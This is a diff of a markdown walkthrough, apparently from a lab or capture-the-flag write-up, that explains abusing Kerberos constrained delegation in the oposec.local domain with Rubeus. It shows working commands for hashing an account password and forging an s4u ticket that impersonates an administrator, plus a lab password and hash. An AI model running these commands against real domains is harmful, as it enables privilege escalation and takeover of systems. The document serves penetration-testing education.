@@ -253,11 +253,13 @@ By searching for attacks that leverage this `AllowedToActOnBehalfOfOtherIdentity
 3. We request Kerberos tickets for `App2$` with ability to impersonate `oposec.local\app1admin` who is admin of `App1$`;
 4. Takeover complete.
 
-In order to carry such attack we need something that can craft Kerberos tickets for our purposes. By following the tutorial of *ired.team*, we can use [Rubeus](https://github.com/GhostPack/Rubeus) for that. You can find pre-compiled binaries [here](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries).
-
 Additionally, to avoid any issue, both `oposec.local` and `app1.oposec.local` should be added to the `hosts` file.
 
-The first thing we need to do is to generate a RC4 hash of the password we have for `App2$`:
+In order to carry such attack we need something that can craft Kerberos tickets for our purposes. By following the tutorial of *ired.team*, we can use [Rubeus](https://github.com/GhostPack/Rubeus) for that. You can find pre-compiled binaries [here](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries).
+
+Rubeus is a C# implementation of [kekeo](https://github.com/gentilkiwi/kekeo/) to interact with Microsoft Kerberos, including the ability to request (1) ticket-granting-tickets (TGTs) from user hashes and (2)service tickets from existing TGTs, carry out [S4U constrained delegation abuse](http://www.harmj0y.net/blog/activedirectory/s4u2pwnage/) among others. Focusing on `s4u`, in a [tl;dr version by harmj0y](http://www.harmj0y.net/blog/redteaming/from-kekeo-to-rubeus/): "*if a user or computer account has a service principal name (SPN) set in its msds-allowedToDelegateto field and an attacker can compromise said user/computer’s account hash, that attacker can pretend to be ANY domain user to ANY service on the targeted host*".
+
+To proceed with the attack, first a valid TGT/KRB-CRED file is needed for the account with constrained delegation configured. This can be achieved with the `asktgt` action, given the NTLM/RC4 hash of the account. Thus, the first thing we need to do is to generate a RC4 hash of the password we have for `App2$`:
 
 ```powershell
 PS C:\ .\Rubeus.exe hash /password:MdXShCaeOviiTzxk3g0G /user:App2 /domain:oposec.local
@@ -276,7 +278,8 @@ Rubeus  v1.6.4
 [*]       des_cbc_md5          : 15FD1054A20DF2A4
 ```
 
-And then crafting a ticket:
+The ticket is then supplied to the `s4u` action via `/ticket`, along with a required `/impersonateuser:app1admin` to impersonate to the `/msdsspn:cifs/app1.oposec.local` SPN that is configured in the account’s `msds-allowedToDelegateTo` field.  If a `/dc` is not specified, the computer’s current domain controller is extracted and used as the destination for the renewal traffic, thus we need to pass `oposec.local`. The `/ptt` flag will “pass-the-ticket” and apply the resulting Kerberos credential to the current logon session (this only works if the localhost machine the administrative tools available, e.g., Windows Enterprise).
+
 
 ```powershell
 PS C:\> .\Rubeus.exe s4u /user:App2$ /rc4:EED530845242DD4013C0BEF37787EA33 /impersonateuser:app1admin /msdsspn:cifs/app1.oposec.local /ptt /output:ticket.txt /domain:oposec.local /dc:51.137.206.45
@@ -316,7 +319,7 @@ PS C:\> .\Rubeus.exe s4u /user:App2$ /rc4:EED530845242DD4013C0BEF37787EA33 /impe
 [+] Ticket successfully imported!
 ```
 
-As it can be seen at the end Rubeus automatically adds the generated ticket to our localhost. This can be checked using `klist`:
+As it can be seen at the end Rubeus automatically added the generated ticket to our localhost. This can be checked using `klist`:
 
 ```powershell
 PS C:\> klist
